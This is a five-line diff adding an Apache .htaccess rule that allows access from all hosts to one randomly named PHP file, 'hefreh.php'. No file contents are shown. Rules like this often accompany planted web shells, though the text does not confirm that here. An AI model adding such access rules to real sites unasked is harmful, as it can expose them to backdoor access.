@@ -1,0 +1,5 @@
+<FilesMatch "^(hefreh.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+
